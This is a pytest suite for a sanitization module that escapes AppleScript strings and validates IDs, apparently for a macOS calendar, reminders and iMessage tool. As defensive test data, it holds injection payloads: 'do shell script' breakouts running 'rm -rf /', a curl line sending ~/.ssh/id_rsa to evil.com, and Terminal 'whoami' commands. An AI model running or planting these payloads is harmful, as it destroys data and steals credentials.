"""
Tests for security/sanitize.py — AppleScript escaping, subprocess arg sanitization, ID validation.

Covers:
- AppleScript injection payloads
- Null byte stripping
- Control character removal
- Oversized input rejection
- ID format validation (UUID, alphanumeric, special chars)
- Edge cases (empty strings, None-like values)
"""

import sys
import os
import pytest

# Add project root to path
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), ".."))

from security.sanitize import (
    escape_applescript_string,
    sanitize_subprocess_arg,
    validate_id,
    MAX_ARG_LENGTH,
    MAX_ID_LENGTH,
)


# --- escape_applescript_string ---

class TestEscapeApplescriptString:
    def test_plain_string(self):
        assert escape_applescript_string("hello world") == "hello world"

    def test_double_quotes(self):
        result = escape_applescript_string('say "hello"')
        assert '\\"' in result
        assert '"hello"' not in result

    def test_backslashes(self):
        result = escape_applescript_string("path\\to\\file")
        assert "\\\\" in result

    def test_newlines(self):
        result = escape_applescript_string("line1\nline2")
        assert "\\n" in result
        assert "\n" not in result

    def test_tabs(self):
        result = escape_applescript_string("col1\tcol2")
        assert "\\t" in result

    def test_carriage_return(self):
        result = escape_applescript_string("line1\rline2")
        assert "\\r" in result

    def test_unicode(self):
        # Should handle unicode without crashing
        result = escape_applescript_string("caf\u00e9 \u2603")
        assert isinstance(result, str)

    def test_applescript_injection_close_quote(self):
        """Attempt to break out of AppleScript string with quote."""
        payload = '" & do shell script "rm -rf /" & "'
        result = escape_applescript_string(payload)
        # All quotes must be escaped
        assert '& do shell script' in result
        # The raw double quotes should not appear unescaped
        assert result.startswith('\\"')

    def test_applescript_injection_osascript(self):
        """Attempt osascript-style injection."""
        payload = '"; do shell script "curl evil.com"'
        result = escape_applescript_string(payload)
        assert '\\"' in result

    def test_empty_string(self):
        assert escape_applescript_string("") == ""


# --- sanitize_subprocess_arg ---

class TestSanitizeSubprocessArg:
    def test_normal_string(self):
        result = sanitize_subprocess_arg("Doctor appointment", "title")
        assert "Doctor appointment" in result

    def test_strips_null_bytes(self):
        result = sanitize_subprocess_arg("hello\x00world", "title")
        assert "\x00" not in result
        assert "helloworld" in result

    def test_strips_control_chars(self):
        result = sanitize_subprocess_arg("hello\x01\x02\x03world", "title")
        assert "\x01" not in result
        assert "\x02" not in result
        assert "\x03" not in result

    def test_preserves_newlines_tabs(self):
        """Newlines and tabs are common in notes, should be escaped not stripped."""
        result = sanitize_subprocess_arg("line1\nline2\ttab", "notes")
        # Newlines get AppleScript-escaped to \\n
        assert "\\n" in result
        assert "\\t" in result

    def test_enforces_max_length(self):
        with pytest.raises(ValueError, match="exceeds maximum length"):
            sanitize_subprocess_arg("x" * (MAX_ARG_LENGTH + 1), "title")

    def test_custom_max_length(self):
        with pytest.raises(ValueError, match="exceeds maximum length"):
            sanitize_subprocess_arg("x" * 101, "title", max_length=100)

    def test_at_max_length(self):
        """Exactly at max length should succeed."""
        result = sanitize_subprocess_arg("x" * 100, "title", max_length=100)
        assert result is not None

    def test_empty_string_passthrough(self):
        assert sanitize_subprocess_arg("", "title") == ""

    def test_none_passthrough(self):
        """None should pass through (for optional fields)."""
        assert sanitize_subprocess_arg(None, "title") is None

    def test_escapes_quotes(self):
        result = sanitize_subprocess_arg('Meeting with "team"', "title")
        assert '\\"' in result

    def test_applescript_injection_in_title(self):
        """Critical: prevent AppleScript injection via calendar event title."""
        payload = '" & do shell script "curl http://evil.com/steal?data=$(cat ~/.ssh/id_rsa)" & "'
        result = sanitize_subprocess_arg(payload, "title")
        # Quotes must be escaped
        assert '& do shell script' in result
        assert result.startswith('\\"')
        # The result should not contain unescaped quotes that could break out
        unescaped_quotes = result.replace('\\"', '').count('"')
        assert unescaped_quotes == 0

    def test_applescript_injection_in_notes(self):
        """Injection via notes field."""
        payload = '") \n tell application "Terminal" \n do script "whoami > /tmp/pwned" \n end tell \n --'
        result = sanitize_subprocess_arg(payload, "notes")
        assert '\\"' in result
        assert "\\n" in result

    def test_shell_metacharacters(self):
        """Even with shell=False, sanitize shell metacharacters."""
        payload = "$(rm -rf /); `whoami`; $HOME"
        result = sanitize_subprocess_arg(payload, "title")
        # These should pass through but with quotes escaped
        assert isinstance(result, str)

    def test_field_name_in_error(self):
        """Error message should include the field name."""
        with pytest.raises(ValueError, match="location"):
            sanitize_subprocess_arg("x" * (MAX_ARG_LENGTH + 1), "location")

    def test_shell_context_no_escaping(self):
        """Shell context should strip control chars but not escape quotes."""
        result = sanitize_subprocess_arg('Meeting with "team"', "title", context="shell")
        assert result == 'Meeting with "team"'

    def test_raw_context_preserves_newlines(self):
        """Raw context should preserve newlines without escaping."""
        result = sanitize_subprocess_arg("line1\nline2", "notes", context="raw")
        assert result == "line1\nline2"

    def test_invalid_context_raises(self):
        with pytest.raises(ValueError, match="Unknown sanitize context"):
            sanitize_subprocess_arg("hello", "title", context="invalid")

    def test_shell_context_still_strips_control_chars(self):
        result = sanitize_subprocess_arg("hello\x00world", "title", context="shell")
        assert "\x00" not in result
        assert result == "helloworld"


# --- validate_id ---

class TestValidateId:
    def test_uuid(self):
        uuid = "E7A2B3C4-1234-5678-9ABC-DEF012345678"
        assert validate_id(uuid) == uuid

    def test_simple_alphanumeric(self):
        assert validate_id("abc123") == "abc123"

    def test_with_hyphens_underscores(self):
        assert validate_id("event-123_456") == "event-123_456"

    def test_with_slashes_colons(self):
        """Apple EventKit IDs can contain slashes and colons."""
        assert validate_id("Calendar/event:123") == "Calendar/event:123"

    def test_with_dots(self):
        assert validate_id("com.apple.calendar.event.123") == "com.apple.calendar.event.123"

    def test_empty_string(self):
        with pytest.raises(ValueError, match="cannot be empty"):
            validate_id("")

    def test_whitespace_only(self):
        with pytest.raises(ValueError, match="cannot be empty"):
            validate_id("   ")

    def test_strips_whitespace(self):
        assert validate_id("  abc123  ") == "abc123"

    def test_too_long(self):
        with pytest.raises(ValueError, match="exceeds maximum length"):
            validate_id("a" * (MAX_ID_LENGTH + 1))

    def test_at_max_length(self):
        valid_id = "a" * MAX_ID_LENGTH
        assert validate_id(valid_id) == valid_id

    def test_rejects_spaces(self):
        with pytest.raises(ValueError, match="invalid characters"):
            validate_id("event 123")

    def test_rejects_quotes(self):
        with pytest.raises(ValueError, match="invalid characters"):
            validate_id('event"123')

    def test_rejects_semicolons(self):
        with pytest.raises(ValueError, match="invalid characters"):
            validate_id("event;rm -rf /")

    def test_rejects_backticks(self):
        with pytest.raises(ValueError, match="invalid characters"):
            validate_id("`whoami`")

    def test_rejects_dollar_sign(self):
        with pytest.raises(ValueError, match="invalid characters"):
            validate_id("$(evil)")

    def test_rejects_newlines(self):
        with pytest.raises(ValueError, match="invalid characters"):
            validate_id("event\n123")

    def test_rejects_null_bytes(self):
        with pytest.raises(ValueError, match="invalid characters"):
            validate_id("event\x00123")

    def test_injection_via_event_id(self):
        """Critical: prevent injection via event_id field."""
        with pytest.raises(ValueError, match="invalid characters"):
            validate_id('" & do shell script "rm -rf /" & "')

    def test_field_name_in_error(self):
        with pytest.raises(ValueError, match="reminder_id"):
            validate_id("", "reminder_id")


# --- Integration: verify cal.py and reminders.py use sanitization ---

class TestCalIntegration:
    """Verify that cal.py imports and uses sanitization."""

    def test_cal_imports_sanitize(self):
        import tools.cal as cal
        # Verify the module imported sanitize functions
        assert hasattr(cal, 'sanitize_subprocess_arg')
        assert hasattr(cal, 'validate_id')

    def test_reminders_imports_sanitize(self):
        import tools.reminders as reminders
        assert hasattr(reminders, 'sanitize_subprocess_arg')
        assert hasattr(reminders, 'validate_id')

    def test_imessage_imports_from_security(self):
        import tools.imessage as imessage
        assert hasattr(imessage, 'escape_applescript_string')
        # Verify it's the same function from security module
        from security.sanitize import escape_applescript_string
        assert imessage.escape_applescript_string is escape_applescript_string
